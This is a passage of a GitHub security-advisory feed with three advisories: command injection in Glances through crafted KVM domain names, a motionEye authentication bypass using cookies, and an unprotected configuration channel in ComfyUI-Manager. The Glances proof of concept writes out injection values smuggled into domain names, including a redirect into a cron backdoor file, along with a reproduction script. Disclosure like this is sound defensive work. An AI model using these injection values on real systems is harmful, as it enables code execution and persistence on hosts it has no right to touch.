-<p><code>secure_popen()</code> is defined in <code>glances/secure.py</code>.  It explicitly splits the command string on <code>&amp;&amp;</code>, <code>|</code>, and <code>&gt;</code> before invoking <code>subprocess.Popen</code> with <code>shell=False</code> on each part, meaning all three operators are treated as real pipeline/redirection control characters:</p>
-<pre><code class="language-python"># glances/secure.py
-def secure_popen(cmd):
-    ret = ''
-    for c in cmd.split('&amp;&amp;'):        # '&amp;&amp;' → two separate processes
-        ret += __secure_popen(c)
-    return ret
-
-def __secure_popen(cmd):
-    for sub_cmd in cmd.split('|'):   # '|' → stdin/stdout piped
-        p = Popen(sub_cmd_split, shell=False, stdin=sub_cmd_stdin, stdout=PIPE, stderr=PIPE)
-    # '&gt;' is split separately for file redirection
-</code></pre>
-<p>By contrast, <code>actions.py</code> sanitises process names through <code>_sanitize_mustache_dict()</code> before they reach <code>secure_popen()</code>.  The <code>vms</code> plugin applies no such protection.</p>
-<p><strong>Confirmed on:</strong> x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).</p>
-<p>All three injection operators were verified:</p>
-<table>
-<thead>
-<tr>
-<th>Operator</th>
-<th>Effect</th>
-<th>Confirmed</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>&amp;&amp;</code></td>
-<td>Second command executes after the virsh call</td>
-<td>Yes</td>
-</tr>
-<tr>
-<td><code>|</code></td>
-<td>Output of virsh piped to injected command</td>
-<td>Yes</td>
-</tr>
-<tr>
-<td><code>&gt;</code></td>
-<td>virsh output redirected to arbitrary file</td>
-<td>Yes</td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="poc">PoC</h3>
-<p><strong>Special configuration required</strong></p>
-<ul>
-<li>Glances must be configured to monitor a KVM/QEMU hypervisor: the <code>vms</code> plugin must be enabled and <code>/usr/bin/virsh</code> must be installed and executable.</li>
-<li>The attacker must have libvirt domain-creation or domain-rename privileges (e.g. membership in the <code>libvirt</code> group, a typical default on  Ubuntu/Debian/Fedora, or a cloud-platform tenant account).</li>
-<li>No custom <code>glances.conf</code> settings are needed beyond a working virsh setup.</li>
-</ul>
-<p><strong>Step 1 — Create a VM with a crafted domain name</strong></p>
-<p>Using the <code>&amp;&amp;</code> operator to chain a second command:</p>
-<pre><code class="language-xml">&lt;domain type="kvm"&gt;
-  &lt;name&gt;productionDB &amp;amp;&amp;amp; touch /tmp/glances_pwned&lt;/name&gt;
-  &lt;memory&gt;131072&lt;/memory&gt;
-  &lt;vcpu&gt;1&lt;/vcpu&gt;
-  &lt;os&gt;&lt;type arch="x86_64"&gt;hvm&lt;/type&gt;&lt;/os&gt;
-&lt;/domain&gt;
-</code></pre>
-<pre><code class="language-bash">virsh define evil-domain.xml
-</code></pre>
-<p><strong>Step 2 — Start Glances with KVM monitoring enabled</strong></p>
-<pre><code class="language-bash">glances                # or: glances -s / glances -w
-</code></pre>
-<p>On the next monitoring cycle Glances calls:</p>
-<pre><code>virsh domstats --nowait "productionDB &amp;&amp; touch /tmp/glances_pwned"
-</code></pre>
-<p>which <code>secure_popen()</code> splits into two processes:</p>
-<ol>
-<li><code>virsh domstats --nowait productionDB</code></li>
-<li><code>touch /tmp/glances_pwned</code></li>
-</ol>
-<p><strong>Step 3 — Verify execution</strong></p>
-<pre><code class="language-bash">ls -la /tmp/glances_pwned   # file will exist, owned by the Glances user
-</code></pre>
-<p><strong>Pipe injection (<code>|</code>) example</strong></p>
-<p>Domain name: <code>"productionDB | tee /tmp/virsh_output_stolen.txt"</code></p>
-<p>The output of the virsh call is piped to <code>tee</code>, writing the data to an attacker-controlled path.</p>
-<p><strong>File-write injection (<code>&gt;</code>) example</strong></p>
-<p>Domain name: <code>"productionDB &gt; /etc/cron.d/glances_backdoor"</code></p>
-<p>The virsh output is redirected to a cron file, enabling persistent code execution on the next cron cycle.</p>
-<p><strong>Minimal Python reproduction (no VM required)</strong></p>
-<pre><code class="language-python">import sys
-sys.path.insert(0, '/path/to/glances')   # adjust to local clone
-from glances.secure import secure_popen
-
-# Simulates the exact call in virsh.py line 185
-domain = 'productionDB &amp;&amp; id'
-result = secure_popen(f'/bin/echo domstats --nowait {domain}')
-print(result)
-# Output will include two lines: the echo output AND the output of `id`
-</code></pre>
-<hr>
-<h3 id="impact">Impact</h3>
-<p><strong>Vulnerability type:</strong> Command Injection (CWE-78)</p>
-<p><strong>Who is impacted:</strong> Any deployment of Glances on a KVM/QEMU hypervisor host where the <code>vms</code> plugin is active.  Exploitation requires the attacker to have libvirt domain-creation or domain-rename rights — a privilege granted by default to members of the <code>libvirt</code> group and to cloud-platform tenant APIs.</p>
-<p><strong>Impact:</strong></p>
-<ul>
-<li><strong>Confidentiality:</strong> Full — arbitrary commands can exfiltrate secrets from the Glances process environment and the file system.</li>
-<li><strong>Integrity:</strong> Full — file-write injection (<code>&gt;</code>) allows placing content in any file writable by the Glances process (cron, authorised_keys, etc.).</li>
-<li><strong>Availability:</strong> Full — the Glances process can be terminated or the host disrupted through the injected commands.</li>
-</ul>
-<p>In cloud and multi-tenant virtualisation environments, Glances commonly runs as root on the hypervisor to access performance counters, so successful exploitation typically yields root-level code execution.</p>
-<hr>
-<h3 id="suggested-fix">Suggested Fix</h3>
-<p>Replace the f-string interpolation with list-based argument passing to avoid any interaction with <code>secure_popen()</code>'s operator splitting logic:</p>
-<pre><code class="language-python"># virsh.py — replace lines 185 and 204 with subprocess.run and explicit arg list from subprocess import run, PIPE
-
-result = run(
-    [VIRSH_PATH, 'domstats', '--nowait', domain],
-    stdout=PIPE, stderr=PIPE, timeout=5
-)
-</code></pre>
-<p>Alternatively, sanitise <code>domain</code> using the same <code>_sanitize_mustache_dict</code> helper already used in <code>actions.py</code>, which strips <code>&amp;&amp;</code>, <code>|</code>, <code>&gt;</code>, <code>;</code>, and backtick characters from string values.</p>
-<p>As a defence-in-depth measure, consider running Glances under a dedicated low-privilege service account with <code>CAP_SYS_PTRACE</code> rather than as root.</p>
-<hr>
-<h3 id="responsible-disclosure">Responsible Disclosure</h3>
-<p>The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.</p>
-<hr>
-<h3 id="credits">Credits</h3>
-<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members
-of the AFINE Team.</p>
-<hr>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-v5r2-qh84-fjx5">https://github.com/nicolargo/glances/security/advisories/GHSA-v5r2-qh84-fjx5</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-v5r2-qh84-fjx5">https://github.com/advisories/GHSA-v5r2-qh84-fjx5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v5r2-qh84-fjx5</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-22T21:14:06.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[motioneye] motionEye: Authentication possible via password hash]]></title>
-        <id>https://github.com/advisories/GHSA-r3cw-c95m-wfh9</id>
-        <link href="https://github.com/advisories/GHSA-r3cw-c95m-wfh9"/>
-        <updated>2026-06-22T20:59:31.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An authentication bypass vulnerability exists due to improper trust in client-controlled cookies. The application accepts user-supplied cookie values containing a username and password-hash-derived value as sufficient authentication material. These cookies can be set or modified prior to login, allowing an unauthenticated attacker to impersonate arbitrary users without knowledge of the plaintext password. This issue stems from the absence of server-side validation of authentication state and reliance on attacker-controlled cookie data</p>
-<h3 id="details">Details</h3>
-<p>The vulnerability arises because the application accepts the client-supplied cookies named <code>meye_password_hash</code> and <code>meye_username</code> as sufficient authentication material. The server does not validate these values against a server-side session or enforce proper authentication checks before establishing an authenticated state. As a result, an unauthenticated attacker can set or modify these cookies to impersonate another user if the target username and corresponding hash are known.</p>
-<p>These cookies normally appear after using the "switch user" functionality; however, they can be added manually prior to authentication using standard browser tools (e.g., developer tools or cookie editors) or dynamically loaded by submitting blank credentials. When supplied, the server accepts them and authenticates the attacker as the specified user bypassing the intended authentication flow</p>
-<p>Additionally, the password-hash value and username for the admin account used by the application is stored in <code>/etc/motioneye/motion.conf</code> which is globally readable by default on the local system. This means any local user with shell access can obtain a valid hash and values and use them to impersonate the admin via the cookie manipulation described above. While local access is required to retrieve the hash, this significantly lowers the barrier to exploitation in multi-user environments. </p>
-<h3 id="poc">PoC</h3>
-<p>Starting state unauthenticated with no cookies:
-<img src="https://github.com/user-attachments/assets/cf4aff78-65f7-4f67-99e2-9134c8f04277" alt="start state" height="475" width="644"></p>
-<p>After manually adding or submitting blank credentials to get the cookies loaded:
-<img src="https://github.com/user-attachments/assets/223878eb-f085-4ac5-a92a-2ac21831c594" alt="empty cookies" height="470" width="643"></p>
-<p>Adding the credentials and refreshing the page gives us a valid session:
-<img src="https://github.com/user-attachments/assets/94b350ef-dd32-4cae-8bd8-e48841873f79" alt="admin login with hash" height="466" width="641"></p>
-<p>version information and session interaction validation
-<img src="https://github.com/user-attachments/assets/94290ad6-4e82-4026-8e27-5374e2f3a631" alt="verison" height="468" width="643"></p>
-<h3 id="impact">Impact</h3>
-<p>Authentication bypass</p>
-<h3 id="who-is-impacted">Who is impacted?</h3>
-<p>Any MotionEye deployment where attackers have access to a username and hash, and/or the <code>/etc/motioneye/motion.conf</code> file with the admin username and hash.</p>
-<p>Potential consequences:</p>
-<ul>
-<li>Account lockouts </li>
-<li>Attacker persistence by changing the password</li>
-<li>Enumeration of data</li>
-<li>Destruction of data</li>
-<li>Exfiltration of data</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-r3cw-c95m-wfh9">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-r3cw-c95m-wfh9</a></li>
-<li><a href="https://github.com/advisories/GHSA-r3cw-c95m-wfh9">https://github.com/advisories/GHSA-r3cw-c95m-wfh9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r3cw-c95m-wfh9</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-22T20:59:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[comfyui-manager] ComfyUI-Manager has an Unprotected Alternate Channel (CWE-420)]]></title>
-        <id>https://github.com/advisories/GHSA-95pq-hr8p-f5g7</id>
-        <link href="https://github.com/advisories/GHSA-95pq-hr8p-f5g7"/>
-        <updated>2026-06-22T19:58:25.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>An <strong>Unprotected Alternate Channel (CWE-420)</strong> vulnerability was discovered in ComfyUI-Manager versions prior to 3.38.</p>
-<h4 id="vulnerability-details">Vulnerability Details</h4>
-<p>In affected versions, ComfyUI-Manager stored its configuration in the <code>user/default/ComfyUI-Manager/</code> directory, which was accessible via ComfyUI's web APIs without proper access control. This unprotected alternate channel allowed remote attackers to read and manipulate configuration files and critical data through the web interface.</p>
-<h4 id="potential-attack-scenarios">Potential Attack Scenarios</h4>
-<p>An attacker exploiting this vulnerability could:</p>
-<ul>
-<li><strong>Modify security settings</strong>: Lower the security level from "strong" to "weak" to enable more dangerous operations</li>
-<li><strong>Tamper with custom node sources</strong>: Add malicious custom node repositories</li>
-<li><strong>Manipulate snapshot data</strong>: Corrupt or alter system snapshots</li>
-<li><strong>Change manager behavior</strong>: Alter various manager configuration settings</li>
-</ul>
-<h4 id="affected-configurations">Affected Configurations</h4>
-<table>
-<thead>
-<tr>
-<th>Configuration</th>
-<th>Risk Level</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Systems running with <code>--listen 0.0.0.0</code> (externally exposed)</td>
-<td><strong>HIGH</strong></td>
-</tr>
-<tr>
-<td>Systems behind reverse proxy without proper access control</td>
-<td><strong>MEDIUM</strong></td>
-</tr>
-<tr>
-<td>Local-only installations (default, localhost only)</td>
-<td><strong>NOT AFFECTED</strong></td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="patches">Patches</h3>
-<p>This issue has been patched in <strong>ComfyUI-Manager version 3.38</strong>.</p>
-<h4 id="requirements">Requirements</h4>
-<table>
-<thead>
-<tr>
-<th>Component</th>
-<th>Minimum Version</th>
-<th>Notes</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ComfyUI</td>
-<td>v0.3.76+</td>
-<td>Required for System User Protection API</td>
-</tr>
-<tr>
-<td>ComfyUI-Manager</td>
-<td>v3.38+</td>
-<td>Contains the security fix</td>
-</tr>
-</tbody></table>
-<h4 id="what-the-patch-does">What the Patch Does</h4>
-<ol>
-<li><strong>Path Migration</strong>: Configuration files moved from unprotected <code>user/default/ComfyUI-Manager/</code> to protected <code>user/__manager/</code></li>
-<li><strong>Protected Directory</strong>: The new <code>__manager/</code> directory leverages ComfyUI's System User Protection API, which blocks external web API access</li>
-<li><strong>Security Level Enforcement</strong>: Settings below "normal" are automatically raised to "normal" during migration</li>
-<li><strong>Legacy Backup</strong>: Old data is backed up to <code>.legacy-manager-backup/</code> with startup reminders until manually deleted</li>
-<li><strong>Fallback Protection</strong>: If ComfyUI &lt; v0.3.76, Manager forces "strong" security mode, blocking new installations until ComfyUI is updated</li>
-</ol>
-<h4 id="patch-details">Patch Details</h4>
-<ul>
-<li><strong>Commit</strong>: <code>aaed1dc</code></li>
-<li><strong>Pull Request</strong>: <a href="https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338">ComfyUI-Manager/#2338</a> <a href="https://github.com/Comfy-Org/ComfyUI/pull/10966">ComfyUI/#10966</a></li>
-<li><strong>Changes</strong>: +780 lines, −61 lines across 13 files</li>
-</ul>
-<hr>
-<h3 id="workarounds">Workarounds</h3>
-<p>If immediate upgrade is not possible, apply the following mitigations:</p>
-<table>
-<thead>
-<tr>
-<th>Mitigation</th>
-<th>Effectiveness</th>
-<th>Effort</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Remove <code>--listen 0.0.0.0</code> flag (use localhost only)</td>
-<td><strong>HIGH</strong></td>
-<td>Low</td>
-</tr>
-<tr>
-<td>Implement firewall rules to block external access to ComfyUI ports</td>
-<td><strong>HIGH</strong></td>
-<td>Medium</td>
-</tr>
-<tr>
-<td>Use reverse proxy with authentication (e.g., nginx + basic auth)</td>
-<td><strong>HIGH</strong></td>
-<td>Medium</td>
-</tr>
-<tr>
-<td>Restrict network access to trusted IPs only</td>
-<td><strong>MEDIUM</strong></td>
-<td>Low</td>
-</tr>
-</tbody></table>
-<p><strong>Note</strong>: These are temporary mitigations. Upgrading to v3.38+ is strongly recommended.</p>
-<hr>
-<h3 id="resources">Resources</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-67303">NVD - CVE-2025-67303</a></li>
-<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md">ComfyUI-Manager v3.38 Security Migration Guide</a></li>
-<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338">Patch Pull Request ComfyUI-Manager/#2338</a></li>
-<li><a href="https://github.com/Comfy-Org/ComfyUI/pull/10966">Patch Pull Request ComfyUI/#10966</a></li>
-</ul>
-<hr>
-<h3 id="credit">Credit</h3>
-<p>This vulnerability was reported by <strong>Ricter Zheng (ricterzheng / 郑杜涛)</strong> from <strong>Tencent Xuanwu Lab</strong> <a href="mailto:ricterzheng@tencent.com">ricterzheng@tencent.com</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-95pq-hr8p-f5g7">https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-95pq-hr8p-f5g7</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-67303">https://nvd.nist.gov/vuln/detail/CVE-2025-67303</a></li>
-<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338/commits/e44c5cef58fb4973670b86433b9d24d077b44a26">https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338/commits/e44c5cef58fb4973670b86433b9d24d077b44a26</a></li>
-<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md">https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md</a></li>
-<li><a href="https://github.com/advisories/GHSA-95pq-hr8p-f5g7">https://github.com/advisories/GHSA-95pq-hr8p-f5g7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-95pq-hr8p-f5g7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-22T19:58:24.000Z</published>
     </entry>
 </feed>
